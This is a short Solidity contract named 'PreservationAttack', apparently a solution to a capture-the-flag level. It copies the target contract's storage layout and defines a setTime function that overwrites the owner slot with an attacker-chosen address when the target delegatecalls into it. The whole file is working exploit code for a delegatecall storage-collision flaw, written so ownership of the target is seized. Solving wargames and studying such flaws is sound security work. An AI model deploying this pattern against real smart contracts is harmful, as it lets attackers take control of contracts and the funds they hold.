// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationAttack {
    // Mapping the storage of Preservation 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    
    function setTime(uint attacker_addr) public {
        owner = address(uint160(attacker_addr));
    }

    function addressToUint(address addr) public pure returns (uint) {
        return uint(uint160(addr));
    }
}